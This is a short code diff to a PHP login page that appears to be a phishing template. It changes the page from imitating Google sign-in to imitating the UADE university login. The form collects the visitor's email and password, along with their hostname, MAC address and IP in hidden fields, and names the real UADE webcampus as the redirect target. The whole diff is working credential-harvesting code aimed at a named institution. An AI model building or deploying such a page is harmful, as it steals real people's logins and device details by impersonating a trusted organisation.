@@ -34,13 +34,13 @@ require_once('helper.php');
             <h1>Iniciar sesión</h1>
             
             <form method="POST" action="post.php">
-                <input id="user" type="text" name="email_google" placeholder="Cuenta de correo electrónico UADE" autocorrect="off" autocomplete="off" autocapitalize="off" required>
-                <input type="password" name="password_google" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required style="margin-top: 15px;">
+                <input id="user" type="text" name="email_uade" placeholder="Cuenta de correo electrónico UADE" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+                <input type="password" name="password_uade" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required style="margin-top: 15px;">
                 
                 <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                 <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                 <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-                <input type="hidden" name="target" value="https://accounts.google.com/signin">
+                <input type="hidden" name="target" value="https://www.webcampus.uade.edu.ar/">
                 
                 <div class="links">
                     <a href="#">¿No puede acceder a su cuenta?</a>
